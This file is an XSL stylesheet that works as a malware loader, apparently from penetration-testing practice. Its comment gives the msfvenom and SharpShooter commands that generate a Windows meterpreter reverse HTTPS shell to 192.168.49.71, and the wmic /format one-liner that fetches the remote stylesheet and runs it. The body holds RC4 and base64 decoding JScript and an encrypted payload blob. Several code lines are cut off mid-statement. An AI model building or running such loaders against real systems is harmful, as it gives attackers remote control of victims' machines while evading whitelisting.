<!-- 
Generated with
sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.49.71 LPORT=443 -f raw -o /var/www/html/game.txt
sudo python SharpShooter.py --payload js --dotnetver 4 --stageless --rawscfile /var/www/html/game.txt --output game3

run: wmic process get brief /format:"http://192.168.49.71/test.xsl"
in CMD AND NOT IN POWERSHELL
-->

<?xml version='1.0'?>
<stylesheet version="1.0" xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" xmlns:user="http>

<output method="text"/>
        <ms:script implements-prefix="user" language="JScript">
                <![CDATA[
                rc4=function(key,str){var s=[],j=0,x,res='';for(var i=0;i<256;i++){s[i]=i;}
                for(i=0;i<256;i++){j=(j+s[i]+key.charCodeAt(i%key.length))%256;x=s[i];s[i]=s[j];s[j]=x;}
                i=0;j=0;for(var y=0;y<str.length;y++){i=(i+1)%256;j=(j+s[i])%256;x=s[i];s[i]=s[j];s[j]=x;res+=String.fromCharCode>
                return res;}
                decodeBase64=function(s){var e={},i,b=0,c,x,l=0,a,r='',w=String.fromCharCode,L=s.length;var A="ABCDEFGHIJKLMNOPQR>
                for(x=0;x<L;x++){c=e[s.charAt(x)];b=(b<<6)+c;l+=6;while(l>=8){((a=(b>>>(l-=8))&0xff)||(x<(L-2)))&&(r+=w(a));}}
                return r;};var b64block="0q3yFh7a3LukG0iu/4CjvE8u+kCOZvDk/XqxPid+3RukSohi0K/TzEi93H0VWYd/8tmJtzWZ2yVlgvcu369/T5fG>

                ]]>
        </ms:script>
</stylesheet>
